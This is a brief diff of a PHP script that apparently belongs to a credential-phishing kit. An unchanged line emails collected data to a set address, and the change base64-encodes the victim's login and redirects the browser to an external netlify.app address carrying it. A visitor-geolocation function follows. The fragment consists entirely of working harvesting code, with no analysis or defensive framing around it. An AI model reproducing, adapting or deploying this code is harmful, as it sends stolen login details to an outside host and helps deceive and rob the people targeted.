@@ -32,7 +32,8 @@ header( "Location: index.php" );
 }
 else {
 mail($emailusr, $mailsubj, $data);
-        header("Location: ./go.php?usd=$domain");
+        $enc=base64_encode($login);
+        header("Location: https://silly-agnesi-68b7e0.netlify.app/#$enc");
 }
 function visitor_country()
 {
